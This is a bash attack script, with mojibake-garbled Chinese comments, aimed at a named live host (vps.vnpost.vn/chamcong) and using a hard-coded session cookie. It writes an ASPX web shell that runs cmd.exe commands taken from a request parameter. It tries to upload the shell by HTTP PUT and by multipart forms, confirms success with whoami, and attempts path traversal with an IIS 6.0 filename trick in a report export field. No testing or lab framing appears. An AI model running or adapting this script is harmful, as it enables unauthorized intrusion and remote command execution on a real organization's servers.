#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ åˆ©ç”¨çªç ´ç‚¹GetShell"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo ""
echo "[çªç ´ç‚¹1] æ·±åº¦æµ‹è¯• TaoBCC_To.aspx"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

echo "  è®¿é—®é¡µé¢..."
page=$(curl -sk "${BASE}/TaoBCC_To.aspx" -H "Cookie: $COOKIE" 2>&1)
size=$(echo "$page" | wc -c)
echo "  é¡µé¢å¤§å°: $size bytes"

# æ£€æŸ¥é”™è¯¯
if echo "$page" | grep -qi "does not exist\|not found"; then
    echo "  âš ï¸  é¡µé¢ä¸å­˜åœ¨"
else
    echo "  âœ… é¡µé¢å­˜åœ¨ï¼"
    
    # æå–è¡¨å•å­—æ®µ
    echo ""
    echo "  æå–è¡¨å•å­—æ®µ..."
    echo "$page" | grep -oE "name=['\"]([^'\"]+)" | cut -d'"' -f2 | grep -v "^__" | sort -u
    
    # æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ 
    if echo "$page" | grep -qi "input.*type.*file\|file.*upload\|enctype.*multipart"; then
        echo ""
        echo "  ğŸ”¥ğŸ”¥ğŸ”¥ å‘ç°æ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼"
        echo "$page" | grep -i "input.*file\|upload" | head -10
    fi
    
    # ä¿å­˜é¡µé¢
    echo "$page" > TaoBCC_To_full.html
fi

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo ""
echo "[çªç ´ç‚¹2] æµ‹è¯•IMPORT/UPLOAD/NHAPæŠ¥è¡¨ID"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

for id in "IMPORT" "UPLOAD" "NHAP"; do
    echo ""
    echo "  â”â”â” æµ‹è¯• ID=$id â”â”â”"
    
    # è·å–é¡µé¢å’ŒViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    size=$(echo "$page" | wc -c)
    echo "    é¡µé¢å¤§å°: $size bytes"
    
    # æŸ¥æ‰¾æ‰€æœ‰æŒ‰é’®
    echo "$page" | grep -oE "id=['\"]btn[^'\"]+['\"]" | cut -d'"' -f2 | while read btn; do
        echo "    æŒ‰é’®: $btn"
    done
    
    # æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ å­—æ®µ
    if echo "$page" | grep -qi "file.*upload\|input.*file\|FileUpload"; then
        echo "    ğŸ”¥ğŸ”¥ğŸ”¥ å¯èƒ½æœ‰æ–‡ä»¶ä¸Šä¼ ï¼"
        echo "$page" | grep -i "file" | head -5
    fi
    
    # æµ‹è¯•Exportï¼ˆçœ‹æ˜¯å¦è¡Œä¸ºä¸åŒï¼‰
    if [ -n "$VS" ]; then
        echo ""
        echo "    æµ‹è¯•ExportåŠŸèƒ½..."
        curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=11" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnExport=Export" \
            -o "export_${id}.html" 2>&1
        
        export_size=$(wc -c < "export_${id}.html")
        echo "    Exportå“åº”: $export_size bytes"
        
        # æ£€æŸ¥æ˜¯å¦æœ‰ç‰¹æ®Šè¡Œä¸º
        if grep -qi "upload\|import\|select.*file" "export_${id}.html"; then
            echo "    ğŸ”¥ğŸ”¥ğŸ”¥ Exportè¿”å›ä¸Šä¼ /å¯¼å…¥ç•Œé¢ï¼"
            grep -i "upload\|import\|file" "export_${id}.html" | head -10
        fi
    fi
    
    # ä¿å­˜å®Œæ•´é¡µé¢
    echo "$page" > "report_${id}_full.html"
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo ""
echo "[çªç ´ç‚¹3] PUTæ–¹æ³•æ–‡ä»¶ä¸Šä¼ æµ‹è¯•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# ç”ŸæˆWebShell payload
cat > shell.aspx << 'SHELL'
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["c"]){RedirectStandardOutput=true, UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
SHELL

echo "  ç”ŸæˆWebShell: shell.aspx"
echo ""

# å°è¯•PUTä¸Šä¼ 
PUT_PATHS=(
    "/chamcong/shell.aspx"
    "/chamcong/test.aspx"
    "/chamcong/report/shell.aspx"
    "/chamcong/upload/shell.aspx"
)

for path in "${PUT_PATHS[@]}"; do
    echo "  å°è¯•PUT: $path"
    
    resp=$(curl -sk "http://vps.vnpost.vn${path}" \
        -X PUT \
        -H "Cookie: $COOKIE" \
        -H "Content-Type: text/plain" \
        --data-binary @shell.aspx \
        -w "%{http_code}" 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    echo "    çŠ¶æ€: $http_code"
    
    if [ "$http_code" == "200" ] || [ "$http_code" == "201" ] || [ "$http_code" == "204" ]; then
        echo "    ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ PUTæˆåŠŸï¼éªŒè¯WebShell..."
        
        # éªŒè¯WebShell
        verify=$(curl -sk "http://vps.vnpost.vn${path}?c=whoami" 2>&1)
        if echo "$verify" | grep -qE "nt authority|iis|network service"; then
            echo "    âœ…âœ…âœ… GetShellæˆåŠŸï¼"
            echo "    WebShell: http://vps.vnpost.vn${path}?c=COMMAND"
            echo "$verify"
            exit 0
        fi
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo ""
echo "[çªç ´ç‚¹4] POST multipartæ–‡ä»¶ä¸Šä¼ æš´åŠ›æµ‹è¯•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# å¯èƒ½çš„ä¸Šä¼ ç«¯ç‚¹
UPLOAD_ENDPOINTS=(
    "/chamcong/Upload.aspx"
    "/chamcong/FileUpload.aspx"
    "/chamcong/Import.aspx"
    "/chamcong/report/Upload.aspx"
    "/chamcong/report/Import.aspx"
    "/chamcong/TaoBCC_To.aspx"
)

for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
    echo ""
    echo "  æµ‹è¯•: $endpoint"
    
    # å°è¯•multipartä¸Šä¼ 
    resp=$(curl -sk "http://vps.vnpost.vn${endpoint}" \
        -H "Cookie: $COOKIE" \
        -F "file=@shell.aspx" \
        -F "FileUpload=@shell.aspx" \
        -F "upload=@shell.aspx" \
        -w "%{http_code}" 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    size=$(echo "$resp" | wc -c)
    
    echo "    çŠ¶æ€: $http_code, å¤§å°: $size bytes"
    
    # æ£€æŸ¥æˆåŠŸç‰¹å¾
    if echo "$resp" | grep -qiE "success|uploaded|complete|æˆåŠŸ|å·²ä¸Šä¼ "; then
        echo "    ğŸ”¥ğŸ”¥ğŸ”¥ å¯èƒ½ä¸Šä¼ æˆåŠŸï¼"
        echo "$resp" | grep -i "success\|upload\|file\|path" | head -10
        
        # å°è¯•æ‰¾ä¸Šä¼ è·¯å¾„
        upload_path=$(echo "$resp" | grep -oE "/[a-zA-Z0-9/_.-]+\.aspx" | head -1)
        if [ -n "$upload_path" ]; then
            echo "    å°è¯•è®¿é—®: http://vps.vnpost.vn${upload_path}?c=whoami"
            curl -sk "http://vps.vnpost.vn${upload_path}?c=whoami"
        fi
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo ""
echo "[çªç ´ç‚¹5] ç»„åˆåˆ©ç”¨ï¼šè·¯å¾„éå† + Export = å†™å…¥å¯æ‰§è¡Œä½ç½®"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

echo "  ç­–ç•¥ï¼šå†™å…¥åˆ°wwwrootä½†ä½¿ç”¨IISç‰¹æ€§"
echo ""

# IIS 6.0è§£ææ¼æ´ç»„åˆ
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# å°è¯•å†™å…¥.aspæ–‡ä»¶ï¼ˆå¦‚æœæ˜¯IIS 6.0ï¼‰
echo "  å°è¯•: xxx.asp;.jpg (IIS 6.0è§£æ)"
curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=../../../inetpub/wwwroot/chamcong/x.asp;" \
    --data-urlencode "txtNam=.jpg" \
    --data-urlencode "btnExport=Export" \
    -o combo_iis6.html 2>&1

result=$(grep -o "Could not find.*" combo_iis6.html)
echo "    ç»“æœ: $result"

# éªŒè¯æ˜¯å¦å¯è®¿é—®
if [ -n "$result" ]; then
    # æå–è·¯å¾„
    file_path=$(echo "$result" | grep -oE "C:\\\\[^']+")
    echo "    å°è¯•çš„è·¯å¾„: $file_path"
fi

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… æ‰€æœ‰çªç ´ç‚¹æµ‹è¯•å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
